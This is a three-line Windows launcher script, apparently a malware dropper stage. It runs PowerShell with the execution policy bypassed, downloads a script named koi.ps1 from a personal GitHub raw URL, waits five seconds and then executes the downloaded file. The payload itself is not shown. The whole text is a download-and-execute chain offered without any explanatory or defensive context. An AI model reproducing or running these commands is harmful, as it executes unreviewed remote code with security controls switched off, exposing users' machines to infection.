PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/jdo19181918/Test/main/koi.ps1 -OutFile koi.ps1"
timeout 5
powershell -ExecutionPolicy ByPass -command ". '.\koi.ps1'"
